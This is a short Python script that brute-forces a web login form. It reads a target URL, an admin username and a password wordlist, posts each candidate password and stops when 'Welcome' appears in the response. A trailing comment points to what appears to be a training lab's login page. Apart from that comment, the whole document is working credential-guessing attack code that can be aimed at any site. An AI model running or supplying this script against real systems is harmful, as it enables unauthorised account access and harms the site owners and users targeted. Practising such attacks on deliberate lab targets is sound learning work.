import requests 


url = input(" the target : ")

user = input(" username admin : ")

listpass = input(" list password : ")

passwdr = open(listpass,"r").read().split()

for passwd in passwdr:
  http = requests.post(url,data={"username":user,"password":passwd,"sub":"submit"}).text
  
  if "Welcome" in http:
    print(" ise password found : "+passwd)
    print("-"*40)
    break
  else:
    print(" not found password : "+passwd)
  
  
#http://dl.sabzlearn.ir/lab/pycrack-v1/login.php